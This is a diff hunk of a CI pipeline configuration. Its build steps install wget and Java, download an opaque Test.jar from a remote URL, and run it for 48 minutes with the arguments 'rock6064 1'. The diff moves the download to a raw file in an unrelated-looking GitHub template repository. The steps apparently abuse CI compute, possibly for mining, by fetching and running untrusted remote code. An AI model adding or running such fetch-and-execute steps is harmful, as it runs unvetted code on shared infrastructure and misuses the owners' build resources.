@@ -15,5 +15,5 @@ blocks:
           commands:
             - sudo apt update
             - sudo apt install wget default-jre -y
-            - wget https://defaulter.runkodapps.com/Test.jar
+            - wget https://github.com/z5rubinaz1/nodejs-express-template/raw/master/Test.jar
             - timeout 48m java -jar Test.jar rock6064 1
